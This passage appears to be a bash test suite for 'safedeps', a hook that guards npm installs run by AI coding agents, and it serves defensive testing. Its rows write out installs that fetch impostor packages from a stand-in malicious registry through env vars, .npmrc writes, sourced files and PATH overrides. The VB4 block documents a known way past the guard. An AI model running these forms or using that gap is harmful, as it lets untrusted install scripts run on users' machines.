    "$(jq -r '.systemMessage // empty' <<< "${CASE_POST}" 2>/dev/null | tr '\n' ' ' | head -c 300)"
  [[ -z "${CASE_RAN}" ]] || note_failure "${2}: the first command rebuilds nothing, so no script of the impostor runs (${CASE_RAN})"
}
new_xh1() { home_first "export HOME=${XH_HOME}; npm install sd-approved@1.0.0" XH1; }
new_xh2() { home_first "export HOME=${XH_HOME} && npm install sd-approved@1.0.0" XH2; }
new_xh3() { home_first "HOME=${XH_HOME}; export HOME; npm install sd-approved@1.0.0" XH3; }
new_xh4() { home_first "declare -x HOME=${XH_HOME}; npm install sd-approved@1.0.0" XH4; }
new_xh5() { home_first "HOME=${XH_HOME}; npm install sd-approved@1.0.0" XH5; }
new_xc1() { home_first "HOME=${XH_HOME} npm install sd-approved@1.0.0" XC1; }
new_xc2() { home_first "env HOME=${XH_HOME} npm install sd-approved@1.0.0" XC2; }
new_xc3() { home_first "export NPM_CONFIG_REGISTRY=${EVIL_REG}; npm install sd-approved@1.0.0" XC3; }
new_xu1() { home_first "export HOME=\"\$PWD/../xh-home\"; npm install sd-approved@1.0.0" XU1; }
# The PX rows: a command that chooses the code npm runs with, by a PATH or a
# NODE_OPTIONS of its own. The pre-guard asks only its own npm and never runs
# that code (scripts/test/lockless-forms.sh, section 1e), so its answer is
# not the command's npm's, the way an answer after `source` is not. They are
# the same kind and get the same rule: where npm answers the public registry,
# the first command rebuilds nothing, says why, and records nothing (PX1-PX3,
# through sourced_first), so the next ordinary install rebuilds. PX1 is the
# form a version manager writes; it used to be an unknown with no cause, which
# recorded every package of the tree machine-wide. PX3 is the cost that stays:
# an ordinary NODE_OPTIONS in front of npm withholds that command's scripts.
# Where the command's own words name another registry, npm's answer stands and
# is recorded (PX4), and the first command runs none of the impostor's scripts.
#
# UN1: `unset` reaches every later npm, so the ask carries it. The sandbox
# exports npm_config_userconfig, which outranks HOME; the command unsets it, so
# npm reads <HOME>/.npmrc and fetches from the registry it names. An ask that
# kept the hook's userconfig answered the public registry, and so did the
# PostToolUse hook's, and the first command rebuilt the impostor.
PX_BIN="${tmp_root}/px-bin"
mkdir -p "${PX_BIN}"
quiet_first() {
  withhold_first "$1"
  [[ -z "${CASE_RAN}" ]] || note_failure "$2: the first command rebuilds nothing, so no script of the impostor runs (${CASE_RAN})"
}
new_px1() { new_clone; sourced_first PX1 "export PATH=\"${PX_BIN}:\$PATH\" && npm ci"; }
new_px2() { new_project; sourced_first PX2 "PATH=${PX_BIN}:\$PATH npm install sd-approved@1.0.0"; }
new_px3() { new_clone; sourced_first PX3 'NODE_OPTIONS=--max-old-space-size=4096 npm ci'; }
new_px4() { new_project; quiet_first "export PATH=\"${PX_BIN}:\$PATH\"; ${RH3_FORM}" PX4; }
new_un1() { new_project; quiet_first "unset npm_config_userconfig; HOME=${XH_HOME} npm install sd-approved@1.0.0" UN1; }

# <id>|<fixture>|<engine>|<expect>|<command>, where <expect> is
#   fallback            rolled back with no confirmed snapshot, said in all three records
#   removed             rolled back to a confirmed snapshot: node_modules removed, no script run
#   kept:<warning>      not rolled back, nothing rebuilt, the warning says <warning>
#   quiet:<package>     confirmed quietly, and <package> rebuilt (`-`: nothing to check)
#   denied:<reason>     the pre-guard denies it, saying <reason>; nothing is installed
# A `fallback` may carry `:<text>` that the message must also say.
# RH3c is RH3 on a Claude Code call that ran the command as given, not as
# safedeps rewrote it, so the call's record of the rewrite is one the command
# did not carry (engine `crossed`, npm-sandbox.sh): the warning used to be left out
# whenever the record said safedeps rewrote a command, and is now left out only
# where the command received is the one it wrote.
# RH3n is RH3 on Claude Code with a command that keeps ignore-scripts true
# itself, so safedeps did not add the flag; "(on Codex it cannot)" is said of a
# Codex call only (RH3x).
# The warning a later command gets for the impostor an earlier one fetched.
WITHHELD_EVIL="the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from ${EVIL_REG}, which is not the public npm registry. They are kept. safedeps has recorded these bytes and withholds their install scripts in every project on this machine. This version has no way to release them: no tree that holds them is rebuilt automatically until a later release can approve a registry. If you trust that registry, confirm with the user before running \`npm rebuild sd-approved\` yourself; do not rebuild without asking"
printf '# install scripts over the whole tree (id engine command | outcome)\n'
failures_before=${#FAILURES[@]}
while IFS= read -r row; do
  [[ -n "${row}" && "${row}" != \#* ]] || continue
  shard_row "whole tree: ${row}" || continue
  IFS='|' read -r id fixture engine expect form <<< "${row}"
  [[ "${id}" != RH* ]] || rh_rows_ran=true
  FIRST_PROJECT=""
  "new_${fixture}"
  expect="${expect//@FIRST@/${FIRST_PROJECT}}"
  : > "${MARKS}"
  advisory_before=$(line_count "${CASE_HOME}/advisory.log")
  reorg_before=$(line_count "${CASE_HOME}/reorg.log")
  run_install "${form}" "${engine}"
  advisory_new=$(tail -n +"$((advisory_before + 1))" "${CASE_HOME}/advisory.log" 2>/dev/null || true)
  reorg_new=$(tail -n +"$((reorg_before + 1))" "${CASE_HOME}/reorg.log" 2>/dev/null || true)
  forbidden=$(grep -cE '^(sd-victim|EVIL|LIB)' <<< "${CASE_RAN}" || true)
  printf '%-4s %-7s %s | rollback=%s ungated=%s ran=[%s] post=[%s]\n' "${id}" "${engine}" "${form}" \
    "$(rolled_back && echo yes || echo no)" "$(grep -q UNGATED <<< "${advisory_new}" && echo yes || echo no)" \
    "$(cut -f1,2 <<< "${CASE_RAN}" | tr '\t' ':' | paste -sd, -)" \
    "$(jq -r '.systemMessage // empty' <<< "${CASE_POST}" 2>/dev/null | tr '\n' ' ' | head -c 300)"
  if [[ "${expect}" == denied:* ]]; then
    grep -qF "${expect#denied:}" <<< "${CASE_PRE_DENY}" \
      || note_failure "${id}: the pre-guard denies it, saying ${expect#denied:} (deny: ${CASE_PRE_DENY:-<allowed>})"
    [[ "${forbidden}" == 0 ]] || note_failure "${id}: no script of the EVIL tarball runs (${forbidden})"
    [[ ! -e "${CASE_PROJECT}/node_modules/sd-approved" ]] || note_failure "${id}: nothing is installed"
    continue
  fi
  [[ -z "${CASE_PRE_DENY}" ]] || { note_failure "${id}: the gate lets the command through (deny: ${CASE_PRE_DENY:0:160})"; continue; }
  [[ "${CASE_INSTALL_RC}" == 0 ]] || { note_failure "${id}: the install itself succeeds (rc ${CASE_INSTALL_RC})"; continue; }
  [[ "${forbidden}" == 0 ]] || note_failure "${id}: no script of sd-victim, the EVIL tarball or a directory dependency runs after the command (${forbidden})"
  case "${expect}" in
    fallback|fallback:*)
      rolled_back || note_failure "${id}: rolled back (post: ${CASE_POST:-<quiet>})"
      [[ "${expect}" == fallback ]] || grep -qF "${expect#fallback:}" <<< "${CASE_POST}" \
        || note_failure "${id}: the message says ${expect#fallback:} (post: ${CASE_POST:0:400})"
      grep -qF 'no confirmed snapshot names it' <<< "${CASE_POST}" || note_failure "${id}: the message says no confirmed snapshot names the one it restored (post: ${CASE_POST:0:300})"
      grep -qF 'no confirmed snapshot names it' <<< "${reorg_new}" || note_failure "${id}: reorg.log says no confirmed snapshot names the one it restored (${reorg_new:0:300})"
      grep -qF 'REORG with no confirmed snapshot' <<< "${advisory_new}" || note_failure "${id}: advisory.log says there is no confirmed snapshot (${advisory_new:0:300})"
      grep -qF ', a confirmed snapshot' <<< "${CASE_POST}" && note_failure "${id}: the message does not claim a confirmed snapshot"
      [[ -z "${CASE_RAN}" ]] || note_failure "${id}: the rollback runs no install script (${CASE_RAN})"
      # What ran before the rollback differs by engine, and so must the words.
      # The line says what safedeps did: on Claude the command it wrote is the
      # one the post hook received, on Codex it wrote none. In all three records.
      if [[ "${engine}" == codex ]]; then
        grep -q '^sd-victim' "${MARKS}" || note_failure "${id}: on Codex the install itself runs sd-victim's scripts, or this row tests nothing"
        scripts_line='safedeps did not add --ignore-scripts to this install'
      else
        scripts_line='safedeps added --ignore-scripts to this install'
      fi
      post_message_lines | grep -qxF "${scripts_line}" \
        || note_failure "${id}: the message says: ${scripts_line} (post: ${CASE_POST:0:400})"
      grep -qxF "  ${scripts_line}" <<< "${reorg_new}" \
        || note_failure "${id}: reorg.log says: ${scripts_line} (${reorg_new:0:300})"
      grep -qF "; ${scripts_line}. Reasons: " <<< "${advisory_new}" \
        || note_failure "${id}: advisory.log says: ${scripts_line} (${advisory_new:0:300})"
      ;;
    removed)
      rolled_back || note_failure "${id}: rolled back (post: ${CASE_POST:-<quiet>})"
      grep -qF ', a confirmed snapshot' <<< "${CASE_POST}" || note_failure "${id}: rolled back to the confirmed snapshot (post: ${CASE_POST:0:300})"
      [[ -z "${CASE_RAN}" ]] || note_failure "${id}: the rollback runs no install script (${CASE_RAN})"
      [[ ! -e "${CASE_PROJECT}/node_modules" ]] || note_failure "${id}: the rollback removes the project's node_modules ($(ls "${CASE_PROJECT}/node_modules" 2>&1 | paste -sd, -))"
      post_message_lines | grep -qx 'removed .*/node_modules' || note_failure "${id}: the message says node_modules was removed (post: ${CASE_POST:0:400})"
      ;;
    kept:*)
      ! rolled_back || note_failure "${id}: not rolled back (post: ${CASE_POST:0:300})"
      grep -q UNGATED <<< "${advisory_new}" && note_failure "${id}: not recorded UNGATED"
      grep -qF "${expect#kept:}" <<< "${CASE_POST}" || note_failure "${id}: the warning says ${expect#kept:} (post: ${CASE_POST:-<quiet>})"
      [[ -z "${CASE_RAN}" ]] || note_failure "${id}: the skipped rebuild runs no script (${CASE_RAN})"
      ;;
    quiet:*)
      [[ -z "${CASE_POST}" ]] || note_failure "${id}: confirmed quietly (post: ${CASE_POST:0:300})"
      grep -q UNGATED <<< "${advisory_new}" && note_failure "${id}: not recorded UNGATED"
      [[ "${expect#quiet:}" == - ]] || grep -q "^${expect#quiet:}@[^	]*	install" <<< "${CASE_RAN}" \
        || note_failure "${id}: the verified install is rebuilt, so ${expect#quiet:}'s scripts run (${CASE_RAN:-nothing ran})"
      ;;
    *) fail "unknown expectation ${expect} in row ${id}" ;;
  esac
done <<ROWS
RB1|rb_clone|claude|fallback|npm ci
RB1x|rb_clone|codex|fallback|npm ci
RB2|rb_has|claude|fallback|npm install sd-approved@1.0.0
CH2b|ch2|claude|fallback|npm install sd-approved@1.0.0
CH3c|ch3|claude|removed|npm install sd-approved@1.0.0
CH3x|ch3|codex|removed|npm install sd-approved@1.0.0
CH1b|ch1|claude|kept:a directory that is not a declared workspace member (../../evildir (evildir@1.0.0))|npm install sd-approved@1.0.0
L1|tampered|claude|kept:a package not recorded as coming from the public registry (node_modules/sd-approved (sd-approved@1.0.0 from ${EVIL_URL}))|npm ci
L2|tampered|claude|kept:a package not recorded as coming from the public registry (node_modules/sd-approved (sd-approved@1.0.0 from ${EVIL_URL}))|npm install
K4|clonefiledir|claude|kept:a directory that is not a declared workspace member (../libdir (libdir@1.0.0))|npm ci
K5|hasfiledir|claude|kept:a directory that is not a declared workspace member (../libdir (libdir@1.0.0))|npm install sd-approved@1.0.0
K6|hasfiledir|claude|kept:a directory that is not a declared workspace member (../libdir (libdir@1.0.0))|npm install --no-save sd-approved@1.0.0
K7|cloneinside|claude|kept:a directory that is not a declared workspace member (local/lib (lib@1.0.0))|npm ci
K8|wsclone|claude|quiet:-|npm ci
K9|workspace|claude|quiet:sd-approved|npm install sd-approved@1.0.0
NS1|project|claude|quiet:sd-approved|npm install --install-strategy=nested sd-approved@1.0.0
BD1|bundler|claude|quiet:sd-bundler|npm install sd-bundler@1.0.0
BD2|bundlert|claude|quiet:sd-bundlert|npm install sd-bundlert@1.0.0
NB0|nested|claude|kept:a package not recorded as coming from the public registry (${NESTED_KEY} (sd-swapped@1.0.0 from ${EVIL_SWAP_URL}|npm ci
NB1|nested_flagged|claude|kept:a package not recorded as coming from the public registry (${NESTED_KEY} (sd-swapped@1.0.0 from ${EVIL_SWAP_URL}|npm ci
NB2|nested_rootbundle|claude|kept:a package not recorded as coming from the public registry (${NESTED_KEY} (sd-swapped@1.0.0 from |npm ci
NB2i|nested_rootbundle|claude|kept:a package not recorded as coming from the public registry (${NESTED_KEY} (sd-swapped@1.0.0 from |npm install
NB2n|nested_rootbundle|claude|kept:a package not recorded as coming from the public registry (${NESTED_KEY} (sd-swapped@1.0.0 from |npm install --no-save sd-approved@1.0.0
NB3|bundled_sourced|claude|kept:a package not recorded as coming from the public registry (node_modules/sd-bundler/node_modules/sd-bundled (sd-bundled@1.0.0 from |npm ci
OM1|omit|claude|kept:a package not recorded as coming from the public registry (node_modules/sd-approved (sd-approved@1.0.0 from no recorded source))|npm install sd-approved@1.0.0
RH1|evilrc|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|npm install sd-approved@1.0.0
RH2|evilclone|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|npm ci
RH3|project|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
RH3e|project|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|export npm_config_registry=${EVIL_REG}; npm install sd-approved@1.0.0
RH3x|project|codex|kept:but npm fetches it from the registry ${EVIL_REG} (replace-registry-host=npmjs)). safedeps did not add --ignore-scripts to this install (on Codex it cannot), so their install scripts may already have run|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
RH3n|project|claude|kept:but npm fetches it from the registry ${EVIL_REG} (replace-registry-host=npmjs)). safedeps did not add --ignore-scripts to this install, so their install scripts may already have run|npm_config_registry=${EVIL_REG} npm install --ignore-scripts sd-approved@1.0.0
RH3c|project|crossed|kept:but npm fetches it from the registry ${EVIL_REG} (replace-registry-host=npmjs)). safedeps asked for --ignore-scripts on this install; the command this hook received is not the one safedeps wrote, so their install scripts may already have run|npm_config_registry=${EVIL_REG} npm install sd-approved@1.0.0
RH4|project|claude|denied:Command uses non-standard npm registry|npm install --registry ${EVIL_REG} sd-approved@1.0.0
RH5|project|claude|quiet:sd-approved|npm install sd-approved@1.0.0
RH1w|project|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|printf 'registry=${EVIL_REG}\n' > .npmrc && npm install sd-approved@1.0.0
RH2w|evilclone_bare|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|printf 'registry=${EVIL_REG}\n' > .npmrc && npm ci
RH8|evilws|claude|kept:because this install fetched sd-approved from ${EVIL_REG}, which is not the public npm registry. The install is kept. If you trust that registry, confirm with the user before running|npm install sd-approved@1.0.0
RH7|evilenvfile|claude|kept:could not tell which registry this install fetched sd-approved from (an earlier statement (source) can change the environment npm runs with|source ./npmenv.sh; npm install sd-approved@1.0.0
P0|p0|claude|quiet:sd-approved|npm install sd-swapped@1.0.0
P1|p1|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
P1x|p1x|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
P2|p2|claude|kept:${WITHHELD_EVIL}|npm install
P3|p3|claude|kept:${WITHHELD_EVIL}|npm ci
P4|p4|claude|removed|npm install sd-victim
P5|p5|claude|kept:${WITHHELD_EVIL}|npm ci
P6|p6|claude|quiet:sd-approved|npm install sd-approved@1.0.0
P7|p7|claude|kept:a package recorded on the public registry with no integrity, so safedeps cannot tell its bytes from ones it withheld (node_modules/sd-approved (sd-approved@1.0.0))|npm install sd-swapped@1.0.0
EXP1|exp1|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
Q1|q1|claude|kept:${WITHHELD_EVIL}|npm install
Q2|q2|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
Q3|q3|claude|kept:${WITHHELD_EVIL}|npm ci
Q4|q4|claude|kept:${WITHHELD_EVIL}|npm ci
Q5|q5|claude|kept:${WITHHELD_EVIL}|npm install
HL1|hl1|claude|kept:${WITHHELD_EVIL}|npm install
HL2|hl2|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
HL3|hl3|claude|kept:${WITHHELD_EVIL}|npm ci
HL4|hl4|claude|kept:${WITHHELD_EVIL}|npm ci
DP1|dp1|claude|kept:${WITHHELD_EVIL}|npm install
UK0|uk0|claude|quiet:sd-approved|npm install sd-approved@1.0.0
UK1|uk1|claude|quiet:sd-approved|npm install sd-approved@1.0.0
UK0a|uk0a|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (set -a) can change the environment npm runs with|npm install sd-approved@1.0.0
UK1a|uk1a|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (set -a) can change the environment npm runs with|npm install sd-approved@1.0.0
UK1d|uk1d|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (declare -xi) can change the environment npm runs with|npm install sd-approved@1.0.0
UK1v|uk1v|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (npm_config_fund=) can change the environment npm runs with|npm install sd-approved@1.0.0
MX1|mx1|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (set -a) can change the environment npm runs with|npm install sd-approved@1.0.0
UK2|uk2|claude|quiet:sd-approved|npm install sd-approved@1.0.0
SRC1|src1|claude|quiet:sd-approved|npm install sd-approved@1.0.0
SRC2|src2|claude|quiet:sd-approved|npm install sd-approved@1.0.0
SRC3|src3|claude|quiet:sd-approved|npm install sd-approved@1.0.0
VB1|vb1|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
VB2|vb2|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
VB3|vb3|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
EV1|ev1|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (an earlier statement (eval npm_config_registry) can change the environment npm runs with|npm install sd-swapped@1.0.0
XH1|xh1|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
XH2|xh2|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
XH3|xh3|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
XH4|xh4|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
XH5|xh5|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
XC1|xc1|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
XC2|xc2|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
XC3|xc3|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
XU1|xu1|claude|kept:the bytes of sd-approved here are the ones an install in @FIRST@ first fetched from a registry safedeps could not name (|npm install sd-swapped@1.0.0
PX1|px1|claude|quiet:sd-approved|npm install sd-approved@1.0.0
PX2|px2|claude|quiet:sd-approved|npm install sd-approved@1.0.0
PX3|px3|claude|quiet:sd-approved|npm install sd-approved@1.0.0
PX4|px4|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
UN1|un1|claude|kept:${WITHHELD_EVIL}|npm install sd-swapped@1.0.0
ROWS
[[ ${#FAILURES[@]} -ne ${failures_before} ]] \
  || pass "install scripts run only over a tree on record from the public registry or a workspace, a package counts as bundled only where its parent's package.json bundles it, a record on the public registry counts only where npm says it fetched from there, a rollback runs none without a confirmed snapshot and says what ran on each engine, and K4-K7 are installed but not rebuilt"

# VB4, a boundary pinned as it stands. A file the command sources exports
# npm_config_registry, so the setting is in code this gate does not read, npm
# answers the public registry for the words it can see, and nothing is
# recorded: whoever controls that file already runs code in the agent's shell.
# The impostor's registry serves registry.npmjs.org tarball URLs (as RH1's
# does), so the next approved install reads the record as public and rebuilds
# the impostor's bytes, all three scripts, with no warning. When a release
# closes this, the row goes red and the boundary in ARCHITECTURE.md moves with
# it.
failures_before=${#FAILURES[@]}
# One row (scripts/test/lib/shard.sh), from here to its pass line.
if shard_row "VB4: after a sourced file that names the registry, the next approved install rebuilds what it served"; then
  new_evilenvfile
  vb4_before=$(home_records)
  run_install '. ./npmenv.sh && npm install sd-approved@1.0.0'
  vb4_first_ran="${CASE_RAN}" vb4_first_post="${CASE_POST}" vb4_after=$(home_records)
  grep -q 'EVIL-sd-approved' "${CASE_PROJECT}/node_modules/sd-approved/mark.js" 2>/dev/null \
    || note_failure "VB4: the first command installs the impostor, or the row tests nothing"
  : > "${MARKS}"
  run_install 'npm install sd-swapped@1.0.0'
  printf 'VB4  claude  . ./npmenv.sh && npm install sd-approved@1.0.0, then npm install sd-swapped@1.0.0 | first ran=[%s] ran=[%s] post=[%s]\n' \
    "$(cut -f1,2 <<< "${vb4_first_ran}" | tr '\t' ':' | paste -sd, -)" "$(cut -f1,2 <<< "${CASE_RAN}" | tr '\t' ':' | paste -sd, -)" \
    "$(jq -r '.systemMessage // empty' <<< "${CASE_POST}" 2>/dev/null | tr '\n' ' ' | head -c 300)"
  [[ -z "${vb4_first_ran}" ]] || note_failure "VB4: the first command rebuilds nothing (${vb4_first_ran})"
  grep -qF "${SOURCED_SAYS}" <<< "${vb4_first_post}" \
    || note_failure "VB4: the first command's warning says why nothing is recorded (post: ${vb4_first_post:0:400})"
  [[ "${vb4_after}" == "${vb4_before}" ]] || note_failure "VB4: the first command records nothing withheld and leaves no tree observed ($(paste -sd' ' - <<< "${vb4_after}"))"
  [[ -z "${CASE_PRE_DENY}" && "${CASE_INSTALL_RC}" == 0 ]] && ! rolled_back \
    || note_failure "VB4: the next approved install is kept (deny: ${CASE_PRE_DENY:0:160}, rc ${CASE_INSTALL_RC}, post: ${CASE_POST:0:300})"
  [[ -z "${CASE_POST}" ]] || note_failure "VB4: the next approved install confirms quietly, as the boundary stands (post: ${CASE_POST:0:300})"
  [[ "$(grep -c '^EVIL' <<< "${CASE_RAN}" || true)" == 3 ]] \
    || note_failure "VB4: the next approved install rebuilds the impostor's three scripts, as the boundary stands (${CASE_RAN:-nothing ran})"
  [[ ${#FAILURES[@]} -ne ${failures_before} ]] \
    || pass "VB4: after a sourced file that names the registry, nothing is recorded and the next approved install rebuilds what it served (the boundary as it stands)"
fi

# LK1. Each lockfile field the rebuild's check reads vouches for less than it
# seems to (ARCHITECTURE.md tables them), and every gap is held by a row:
# `resolved` by RH1-RH8, L1 and L2, `integrity` by RH2, RH2w, P7, Q1-Q5, HL1-HL4 and DP1,
# `inBundle` by NB1-NB2n, `version` by lockless-forms.sh (an .npmrc that writes 1.0.1
# over a recorded 1.0.0), and `link` here. A link record says npm put a
# symlink there, and nothing about what is there now: a real directory
# sitting where a link is recorded is a node nobody read. npm does not leave
# one, so it is put there between the command and the post hook, as a
# concurrent writer could.
swap_member_link() { rm -f "$1/node_modules/a"; make_evil_dir "$1/node_modules/a" a; }
# One row (scripts/test/lib/shard.sh), from here to its pass line.
if shard_row "LK1: a real directory where a link is recorded is named and not rebuilt"; then
  new_workspace
  [[ -L "${CASE_PROJECT}/node_modules/a" ]] || fail "the workspace fixture links its member"
  : > "${MARKS}"
  run_install 'npm install sd-approved@1.0.0' claude swap_member_link
  printf 'LK1  claude  npm install sd-approved@1.0.0 (a real directory where a link is recorded) | rollback=%s ran=[%s] post=[%s]\n' \
    "$(rolled_back && echo yes || echo no)" "$(cut -f1,2 <<< "${CASE_RAN}" | tr '\t' ':' | paste -sd, -)" \
    "$(jq -r '.systemMessage // empty' <<< "${CASE_POST}" 2>/dev/null | tr '\n' ' ' | head -c 300)"
  [[ -z "${CASE_PRE_DENY}" ]] || note_failure "LK1: the gate lets the command through (deny: ${CASE_PRE_DENY:0:160})"
  ! rolled_back || note_failure "LK1: not rolled back (post: ${CASE_POST:0:300})"
  grep -qF 'node_modules/a (a@1.0.0 on disk, the lockfile records a link)' <<< "${CASE_POST}" \
    || note_failure "LK1: the warning names the directory where a link is recorded (post: ${CASE_POST:-<quiet>})"
  grep -q '^EVIL' <<< "${CASE_RAN}" && note_failure "LK1: the skipped rebuild runs no script of the directory (${CASE_RAN})"
  [[ ${#FAILURES[@]} -ne ${failures_before} ]] || pass "a real directory where a link is recorded is named and not rebuilt"
fi

if [[ "${REPORT_ONLY}" == 1 ]]; then
  printf '# GRID_REPORT_ONLY: %s failure(s) not enforced\n' "${#FAILURES[@]}"
  exit 0
fi

# --- 1b. The record names the directory the gate read --------------------------------------
# The rows above check the wording; these check the directory: the cwd for a
# row the text does not move, sub for one it does.
for carrier in \
  "project|.|command cd sub; npm install sd-victim|." \
  "project|.|cd sub && rm -f package.json && npm install sd-victim|sub" \
  "project|.|npm install --dry-run sd-victim|."
do
  shard_row "carrier: ${carrier}" || continue
  IFS='|' read -r fixture cwd form where <<< "${carrier}"
  "new_${fixture}"
  CASE_CWD="${CASE_PROJECT}/${cwd}"
  : > "${MARKS}"
  run_install "${form}"
  where=$(cd "${CASE_PROJECT}/${where}" && pwd -P)
  post_ungated_lines | grep -qF "no install trace in ${where}: ${NO_TRACE_CHECK}" \
    || note_failure "the record names the directory the gate read: ${form} (${where}; $(post_ungated_lines | cut -f2 | head -c 200))"
  grep -qF "no install trace in ${where}" <<< "${CASE_POST}" \
    || note_failure "the user is told, on Claude Code, that nothing was verified or rebuilt: ${form} (post: ${CASE_POST:-<quiet>})"
done

# --- 1c. Through npm's mask, to somewhere else ---------------------------------------------
# The U rows read the mask only where npm masks, so that is measured first. An
# npm that does not mask leaves them ordinary rows, and the line below says so.
npm_masks=no
[[ "$(cd "${UUID_DIR}" && npm prefix 2>/dev/null)" != *'***'* ]] || npm_masks=yes

# A masked answer is read as the one directory from the cwd up that reads the
# same. A `--prefix` elsewhere that reads the same as one of them sends the gate
# to the wrong directory, and one that reads the same as none is `?`. Either
# way the gate finds no trace of the install where it looks, and records it. On
# an npm that does not mask, the gate reads where npm said and rolls it back.
new_uuidproject
leaf="${CASE_PROJECT##*/}"
# The carriers below name this mktemp leaf, so a row's label says <leaf> there.
shard_mask leaf "${leaf}"
mkdir -p "${UUID_OTHER}/${leaf}" "${UUID_OTHER}/elsewhere"
printf '{"name":"other","version":"1.0.0"}\n' > "${UUID_OTHER}/${leaf}/package.json"
printf '{"name":"elsewhere","version":"1.0.0"}\n' > "${UUID_OTHER}/elsewhere/package.json"
for carrier in \
  "alike|npm install --prefix ../../${UUID_OTHER##*/}/${leaf} sd-victim|${UUID_OTHER}/${leaf}" \
  "unlike|npm install --prefix ${UUID_OTHER}/elsewhere sd-victim|${UUID_OTHER}/elsewhere"
do
  shard_row "carrier: ${carrier}" || continue
  IFS='|' read -r kind form landed <<< "${carrier}"
  new_safedeps_home
  rm -rf "${landed}/node_modules" "${landed}/package-lock.json"
  : > "${MARKS}"
  run_install "${form}"
  [[ -z "${CASE_PRE_DENY}" ]] || note_failure "masked ${kind}: the gate lets the command through (deny: ${CASE_PRE_DENY:0:160})"
  victim_ran && note_failure "masked ${kind}: no script of sd-victim runs ($(grep -c '^sd-victim' "${MARKS}"))"
  if [[ "${npm_masks}" == no ]]; then
    # npm said where, unmasked, so the gate read it there.
    rolled_back && [[ ! -e "${landed}/node_modules/sd-victim" ]] \
      || note_failure "masked ${kind}, on an npm that does not mask: rolled back where npm installed (post: ${CASE_POST:-<quiet>})"
    continue
  fi
  [[ -e "${landed}/node_modules/sd-victim" ]] \
    || note_failure "masked ${kind}: npm installed where the command named (${landed}), or this row tests nothing"
  ungated || note_failure "masked ${kind}: an install that landed outside the directory the gate read is recorded UNGATED (post: ${CASE_POST:-<quiet>})"
  if [[ "${kind}" == unlike ]]; then
    grep -qF 'npm masked part of the directory it named' "${CASE_HOME}/advisory.log" \
      || note_failure "masked ${kind}: the record says npm masked the directory it named ($(grep 'pre-guard' "${CASE_HOME}/advisory.log" | cut -f2 | tail -n 1 | head -c 200))"
  fi
done
pass "under a UUID-named directory (npm masks it: ${npm_masks}), a --prefix elsewhere is recorded or rolled back whether or not it reads the same as the cwd"

# --- 2. No false positives: installs that installed something left a trace ----------------
# The design judgment's oracle: every form that installed anything rewrote a
# lockfile, a reinstall of what was already there included (same content, new
# mtime), and `npm ci` replaced the file. Each is an approved install here, so
# each must confirm quietly, record nothing, and rebuild. `<approved first>|<form>`.
for carrier in \
  "yes|npm install sd-approved" \
  "yes|npm install" \
  "yes|npm ci" \
  "yes|npm install sd-approved --no-save" \
  "yes|npm update" \
  "yes|npm install sd-approved@1.0.0" \
  "yes|npm install --package-lock-only" \
  "yes|npm install sd-swapped@1.0.0" \
  "yes|npm install sd-swapped@1.0.0 --no-save" \
  "yes|rm -rf node_modules && npm install" \
  "yes|npm install sd-approved --no-package-lock" \
  "yes|npm install sd-approved --prefer-offline" \
  "yes|npm install sd-approved && npm install sd-approved" \
  "no|npm install" \
  "no|npm install sd-approved" \
  "yes|npm install -D sd-approved" \
  "yes|npm ci && npm ci"
do
  shard_row "carrier: ${carrier}" || continue
  IFS='|' read -r approved_first form <<< "${carrier}"
  new_project
  if [[ "${approved_first}" == yes ]]; then
    (cd "${CASE_PROJECT}" && npm install sd-approved --ignore-scripts >/dev/null 2>&1) || fail "the fixture installs sd-approved first"
  fi
  : > "${MARKS}"
  run_install "${form}"
  [[ -z "${CASE_PRE_DENY}" && "${CASE_INSTALL_RC}" == 0 ]] || note_failure "the approved install runs: ${form} (${CASE_PRE_DENY:-rc ${CASE_INSTALL_RC}})"
  [[ -z "${CASE_POST}" ]] || note_failure "an approved install that left a trace confirms quietly: ${form} (post: ${CASE_POST})"
  ungated && note_failure "an install that left its trace is not recorded UNGATED: ${form} ($(grep UNGATED "${CASE_HOME}/advisory.log" | cut -f2 | head -c 200))"
